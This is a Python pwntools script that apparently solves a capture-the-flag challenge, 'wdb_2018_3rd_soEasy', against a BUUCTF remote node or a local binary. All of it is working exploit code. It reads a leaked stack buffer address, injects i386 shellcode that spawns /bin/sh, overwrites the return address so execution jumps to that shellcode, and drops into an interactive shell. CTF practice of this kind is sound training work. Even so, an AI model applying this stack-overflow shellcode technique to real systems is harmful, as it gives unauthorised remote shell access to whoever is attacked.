from pwn import *
from sys import argv

def bytes2int(content):
	return str(content,encoding='utf-8')

context(arch='i386',log_level='debug')
binary = './wdb_2018_3rd_soEasy'
elf = ELF(binary)
p = remote('node4.buuoj.cn',26471) if argv[1] == 'r' else process(binary)

p.recvuntil(b'give you a gift->')
buf_addr = int(bytes2int(p.recv(10)),16)
log.success('buf_addr '+hex(buf_addr))
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(0x48+4,b'\x00') + p32(buf_addr)

p.sendafter(b'what do you want to do?',payload)
p.interactive()
